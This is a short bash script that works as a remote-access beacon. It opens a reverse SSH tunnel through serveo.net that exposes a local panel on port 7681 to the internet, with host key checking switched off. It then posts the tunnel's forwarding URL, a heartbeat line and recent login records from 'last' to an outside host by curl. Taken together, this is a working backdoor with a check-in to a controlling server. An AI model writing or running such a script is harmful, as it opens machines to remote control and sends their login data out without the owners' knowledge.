#!/bin/bash
URL="4f6ce0d2037780f3-103-95-173-85.serveousercontent.com"

# 1. Kill any hung SSH tunnels to refresh the link
pkill -f "ssh -R 80:localhost:7681"

# 2. Start the Panel and Tunnel, then GRAB the new URL
# The '2>&1' and 'stdbuf' are key to catching the link as it generates
(
  ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=10 -R 80:localhost:7681 serveo.net 2>&1 | \
  grep -m 1 "Forwarding" | \
  curl -X POST -H "Content-Type: text/plain" --data-binary @- "https://$URL"
) &

# 3. Heartbeat (The 'last' info you're currently seeing)
echo "--- [PULSE] System Active | $(date) ---" | curl -X POST -d @- "https://$URL"
last | head -n 2 | curl -X POST -d @- "https://$URL"
